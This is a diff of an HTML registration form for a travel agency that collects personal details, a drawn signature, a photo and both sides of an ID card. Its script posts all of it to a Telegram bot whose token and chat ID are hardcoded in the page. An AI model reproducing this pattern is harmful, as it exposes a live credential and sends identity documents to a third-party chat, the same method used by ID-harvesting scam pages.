@@ -1,266 +1,150 @@
 <!DOCTYPE html>
 <html lang="am">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>WILLY TRAVEL AGENCY - Mobile Form</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WILLY TRAVEL AGENCY - Registration</title>
 
 <style>
-  :root{--accent:#0a8d34;--danger:#e63939;}
-
-  body{
-    font-family:Arial,Helvetica,sans-serif;
-    background:#f2f2f2;
-    margin:0;padding:12px;
-  }
-
-  .container{
-    max-width:760px;margin:auto;background:#fff;
-    padding:14px;border-radius:10px;
-    box-shadow:0 6px 20px rgba(0,0,0,.08);
-  }
-
-  .flag{display:block;margin:6px auto;width:110px}
-  h1{text-align:center;margin:6px 0;font-size:20px;font-weight:700}
-
-  label{font-weight:700;margin-top:8px;display:block}
-  input,select,button{
-    font-size:16px;padding:10px;
-    border-radius:8px;border:1px solid #cfcfcf;
-    box-sizing:border-box;
-  }
-
-  .row{display:flex;gap:10px;flex-direction:column}
-  @media(min-width:640px){.row.two{flex-direction:row}}
-
-  .img-preview{
-    width:100%;max-width:220px;height:160px;
-    object-fit:cover;border:1px solid #ddd;border-radius:6px;margin-top:6px
-  }
-
-  .section{
-    background:#f7f7f7;padding:8px;
-    border-radius:6px;margin-top:14px;font-weight:700
-  }
-
-  canvas{
-    width:100%;height:200px;border:2px solid #333;
-    border-radius:6px;touch-action:none;background:#fff;display:block
-  }
-
-  .controls{display:flex;gap:8px;margin-top:8px}
-  .controls button{flex:1}
-
-  .btn-primary{background:var(--accent);color:#fff;border:none}
-  .btn-clear{background:var(--danger);color:#fff;border:none}
-
-  /* POPUP */
-  #popupOverlay{
-    position:fixed;top:0;left:0;width:100%;height:100%;
-    background:rgba(0,0,0,.65);
-    display:none;align-items:center;justify-content:center;
-    z-index:999;
-  }
-  #popupBox{
-    width:86%;max-width:360px;background:#fff;border-radius:14px;
-    padding:20px;text-align:center;
-    animation:popScale .4s ease;
-  }
-  @keyframes popScale{
-    0%{transform:scale(0.5);opacity:0}
-    100%{transform:scale(1);opacity:1}
-  }
-  .popup-title{
-    font-size:20px;font-weight:700;color:#0a8d34;margin-bottom:10px;
-  }
-  .popup-code{
-    font-size:24px;font-weight:800;color:#004aad;
-    animation:codeGlow 1.2s infinite alternate;
-  }
-  @keyframes codeGlow{
-    from{opacity:0.5;transform:scale(1)}
-    to{opacity:1;transform:scale(1.08)}
-  }
-
-  /* Processing Loader */
-  #loader{
-    display:none;
-    position:fixed;top:0;left:0;width:100%;height:100%;
-    background:rgba(0,0,0,.6);
-    z-index:1000;
-    align-items:center;justify-content:center;
-    color:white;font-size:22px;font-weight:bold;
-  }
+:root{--accent:#0a8d34;--danger:#e63939}
+body{margin:0;padding:12px;font-family:Arial;background:#f2f2f2}
+.container{max-width:760px;margin:auto;background:#fff;padding:14px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.08)}
+.flag{width:110px;display:block;margin:auto}
+h1{text-align:center;font-size:20px;margin:6px 0}
+label{font-weight:bold;margin-top:8px;display:block}
+input,select,button{width:100%;padding:10px;font-size:16px;border-radius:8px;border:1px solid #ccc;margin-top:4px}
+.section{margin-top:14px;background:#f7f7f7;padding:8px;border-radius:6px;font-weight:bold}
+.img-preview{width:100%;max-width:220px;height:160px;object-fit:cover;border:1px solid #ddd;border-radius:6px;margin-top:6px;display:none}
+canvas{width:100%;height:200px;border:2px solid #333;border-radius:6px;touch-action:none}
+.controls{display:flex;gap:8px;margin-top:8px}
+.controls button{flex:1}
+.btn-primary{background:var(--accent);color:#fff;border:none}
+.btn-clear{background:var(--danger);color:#fff;border:none}
+#loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:1000;align-items:center;justify-content:center;color:#fff;font-size:22px}
+#popupOverlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.65);align-items:center;justify-content:center;z-index:999}
+#popupBox{background:#fff;padding:20px;border-radius:14px;text-align:center;width:90%;max-width:360px}
+.popup-title{font-size:20px;font-weight:bold;color:#0a8d34}
+.popup-code{font-size:24px;font-weight:800;color:#004aad;margin-top:10px}
 </style>
 </head>
+
 <body>
 
 <div id="loader">Processing... Please wait</div>
 
 <div class="container">
+<img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">
+<h1>WILLY TRAVEL AGENCY</h1>
 
-  <img class="flag" src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg">
-  <h1>WILLY TRAVEL AGENCY</h1>
+<label>Date</label>
+<input type="date" id="dateInput">
 
-  <div class="row two">
-    <div style="flex:1">
-      <label>ፎቶ አስገባ / Upload Photo</label>
-      <input type="file" accept="image/*" id="photoInput">
-      <img id="photoPreview" class="img-preview" style="display:none">
-    </div>
+<label>Upload Photo</label>
+<input type="file" id="photoInput" accept="image/*">
+<img id="photoPreview" class="img-preview">
 
-    <div style="width:160px">
-      <label>ቀን / Date</label>
-      <input type="date" id="dateInput">
-    </div>
-  </div>
+<div class="section">Identity Information</div>
 
-  <div class="section">Identity of Registrant</div>
+<label>Full Name</label><input id="fullName">
+<label>Sex</label>
+<select id="sex"><option>Male</option><option>Female</option></select>
+<label>Age</label><input type="number" id="age">
+<label>Phone</label><input id="phone">
+<label>Address</label><input id="address">
+<label>Height (cm)</label><input type="number" id="height">
+<label>Weight (kg)</label><input type="number" id="weight">
+<label>District</label><input id="district">
+<label>Kebele</label><input id="kebele">
+<label>Birth Date</label><input type="date" id="bod">
+<label>Birth Place</label><input id="bop">
 
-  <label>ሙሉ ስም / FULL NAME</label><input id="fullName">
-  <label>ፆታ / SEX</label>
-  <select id="sex"><option>Male</option><option>Female</option></select>
-  <label>እድሜ / AGE</label><input id="age" type="number">
+<div class="section">Holder Information</div>
+<label>Holder Name</label><input id="holderName">
+<label>Holder Phone</label><input id="holderPhone">
 
-  <label>ስልክ ቁጥር / PHONE</label><input id="phone">
-  <label>አድራሻ / ADDRESS</label><input id="address">
+<div class="section">Signature</div>
+<canvas id="signaturePad"></canvas>
+<div class="controls">
+<button class="btn-clear" id="clearBtn">Clear</button>
+<button class="btn-primary" id="previewBtn">Preview</button>
+</div>
+<img id="signaturePreview" class="img-preview">
 
-  <label>ቁመት / Height (cm)</label><input id="height" type="number">
-  <label>ክብደት / Weight (kg)</label><input id="weight" type="number">
+<div class="section">ID Upload</div>
+<label>ID Front</label>
+<input type="file" id="idFrontInput" accept="image/*">
+<img id="idFrontPreview" class="img-preview">
 
+<label>ID Back</label>
+<input type="file" id="idBackInput" accept="image/*">
+<img id="idBackPreview" class="img-preview">
 
-  <label>ወረዳ / District</label><input id="district">
-  <label>ቀበሌ / Kebele</label><input id="kebele">
-
-  <label>የትውልድ ቀን / Birth Date</label><input id="bod" type="date">
-  <label>የትውልድ ቦታ / Birth Place</label><input id="bop">
-
-  <div class="section">Holder Information</div>
-  <label>ስም / NAME</label><input id="holderName">
-  <label>ስልክ / PHONE</label><input id="holderPhone">
-
-  <div class="section">Signature</div>
-  <canvas id="signaturePad"></canvas>
-  <div class="controls">
-    <button class="btn-clear" id="clearBtn">Clear</button>
-    <button class="btn-primary" id="previewBtn">Preview</button>
-  </div>
-  <img id="signaturePreview" class="img-preview" style="display:none">
-
-  <div class="section">ID Upload</div>
-
-  <label>ID Front</label>
-  <input type="file" accept="image/*" id="idFrontInput">
-  <img id="idFrontPreview" class="img-preview" style="display:none">
-
-  <label>ID Back</label>
-  <input type="file" accept="image/*" id="idBackInput">
-  <img id="idBackPreview" class="img-preview" style="display:none">
-
-  <button id="submitBtn" class="btn-primary" style="margin-top:14px">Submit</button>
+<button id="submitBtn" class="btn-primary" style="margin-top:14px">Submit</button>
 </div>
 
-<!-- POPUP -->
 <div id="popupOverlay">
-  <div id="popupBox">
-    <div class="popup-title">Form Submitted Successfully!</div>
-    <div>Your Unique Code:</div>
-    <div id="uniqueCode" class="popup-code"></div>
-  </div>
+<div id="popupBox">
+<div class="popup-title">Form Submitted Successfully</div>
+<div class="popup-code" id="uniqueCode"></div>
+</div>
 </div>
 
 <script>
-const $ = id => document.getElementById(id);
+const $=id=>document.getElementById(id);
 
 /* Image Preview */
-function preview(input, img){
-  $(input).addEventListener("change", () => {
-    const f = $(input).files[0];
-    if (!f){ $(img).style.display="none"; return; }
-    $(img).src = URL.createObjectURL(f);
-    $(img).style.display="block";
-  });
-}
+function preview(i,p){$(i).onchange=()=>{const f=$(i).files[0];if(f){$(p).src=URL.createObjectURL(f);$(p).style.display="block"}}}
 preview("photoInput","photoPreview");
 preview("idFrontInput","idFrontPreview");
 preview("idBackInput","idBackPreview");
 
-/* Signature Pad */
-const canvas=$("signaturePad");
-const ctx=canvas.getContext("2d");
-let drawing=false;
-
-function resizeCanvas(){
-  const r=canvas.getBoundingClientRect();
-  canvas.width=r.width;
-  canvas.height=r.height;
-  ctx.lineWidth=2.5;
-  ctx.lineCap="round";
-}
-resizeCanvas();
-
-canvas.addEventListener("pointerdown",e=>{
-  drawing=true;
-  ctx.beginPath();
-  ctx.moveTo(e.offsetX,e.offsetY);
-});
-canvas.addEventListener("pointermove",e=>{
-  if(!drawing)return;
-  ctx.lineTo(e.offsetX,e.offsetY);
-  ctx.stroke();
-});
-canvas.addEventListener("pointerup",()=>drawing=false);
-
-$("clearBtn").onclick=()=>{
-  ctx.clearRect(0,0,canvas.width,canvas.height);
-  $("signaturePreview").style.display="none";
-};
-
-$("previewBtn").onclick=()=>{
-  $("signaturePreview").src=canvas.toDataURL();
-  $("signaturePreview").style.display="block";
-};
+/* Signature */
+const canvas=$("signaturePad"),ctx=canvas.getContext("2d");
+let draw=false;
+function resize(){const r=canvas.getBoundingClientRect();canvas.width=r.width;canvas.height=r.height;ctx.lineWidth=2.5;ctx.lineCap="round"}
+resize();
+canvas.onpointerdown=e=>{draw=true;ctx.beginPath();ctx.moveTo(e.offsetX,e.offsetY)}
+canvas.onpointermove=e=>{if(draw){ctx.lineTo(e.offsetX,e.offsetY);ctx.stroke()}}
+canvas.onpointerup=()=>draw=false;
+$("clearBtn").onclick=()=>ctx.clearRect(0,0,canvas.width,canvas.height);
+$("previewBtn").onclick=()=>{$("signaturePreview").src=canvas.toDataURL();$("signaturePreview").style.display="block"}
 
 /* Telegram */
 const BOT="8547531640:AAGBhfzBDJ18t40R4F4z-sO5a50Q6Mj2Fgw";
 const CHAT="8267646853";
 
-async function sendText(text){
-  return fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({ chat_id:CHAT, text })
-  });
+async function sendText(t){
+await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({chat_id:CHAT,text:t})
+});
 }
-
-async function sendPhoto(file,caption=""){
-  const fd=new FormData();
-  fd.append("chat_id",CHAT);
-  fd.append("photo",file);
-  fd.append("caption",caption);
-
-  return fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{
-    method:"POST", body:fd
-  });
+async function sendPhoto(f,c){
+const fd=new FormData();
+fd.append("chat_id",CHAT);
+fd.append("photo",f);
+fd.append("caption",c);
+await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:"POST",body:fd});
 }
+function canvasBlob(){return new Promise(r=>canvas.toBlob(b=>r(b)))}
 
-/* Submit */
+/* SUBMIT */
 $("submitBtn").onclick=async()=>{
+if(!$("fullName").value.trim()) return alert("Enter full name");
 
-  if(!$("fullName").value.trim()){
-    alert("Enter Full Name"); return;
-  }
+$("loader").style.display="flex";
+$("submitBtn").disabled=true;
 
-  // Show loader
-  $("loader").style.display="flex";
+const code="WTA-"+Math.floor(100000+Math.random()*900000);
+$("uniqueCode").innerText=code;
 
-  const code="WTA-"+(Math.floor(Math.random()*900000)+100000);
-  $("uniqueCode").innerText=code;
+const message = `
+📌 WILLY TRAVEL AGENCY – FULL FORM
 
-  let msg=
-`📌 WILLY TRAVEL AGENCY - NEW FORM
---------------------------------------
-👤 Name: ${$("fullName").value}
+📅 Date: ${$("dateInput").value}
+
+👤 Full Name: ${$("fullName").value}
 ⚧ Sex: ${$("sex").value}
 🎂 Age: ${$("age").value}
 📞 Phone: ${$("phone").value}
@@ -268,7 +152,6 @@ $("submitBtn").onclick=async()=>{
 
 📏 Height: ${$("height").value} cm
 ⚖️ Weight: ${$("weight").value} kg
-⭐ Mark: ${$("distinct").value}
 
 🌍 District: ${$("district").value}
 🏘 Kebele: ${$("kebele").value}
@@ -276,27 +159,23 @@ $("submitBtn").onclick=async()=>{
 🎉 Birth Date: ${$("bod").value}
 📍 Birth Place: ${$("bop").value}
 
-👨‍👩‍👦 Holder: ${$("holderName").value}
+👨 Holder Name: ${$("holderName").value}
 📞 Holder Phone: ${$("holderPhone").value}
 
 🔐 UNIQUE CODE: ${code}
 `;
 
-  await sendText(msg);
+await sendText(message);
 
-  if($("photoInput").files[0]) await sendPhoto($("photoInput").files[0],"User Photo");
-  if($("idFrontInput").files[0]) await sendPhoto($("idFrontInput").files[0],"ID Front");
-  if($("idBackInput").files[0]) await sendPhoto($("idBackInput").files[0],"ID Back");
+if($("photoInput").files[0]) await sendPhoto($("photoInput").files[0],"Applicant Photo");
+if($("idFrontInput").files[0]) await sendPhoto($("idFrontInput").files[0],"ID Front");
+if($("idBackInput").files[0]) await sendPhoto($("idBackInput").files[0],"ID Back");
 
-  canvas.toBlob(async blob=>{
-    if(blob) await sendPhoto(blob,"Signature");
-  });
+const sig=await canvasBlob();
+if(sig) await sendPhoto(sig,"Signature");
 
-  // Hide loader & show popup
-  setTimeout(()=>{
-    $("loader").style.display="none";
-    $("popupOverlay").style.display="flex";
-  },1200);
+$("loader").style.display="none";
+$("popupOverlay").style.display="flex";
 };
 </script>
 
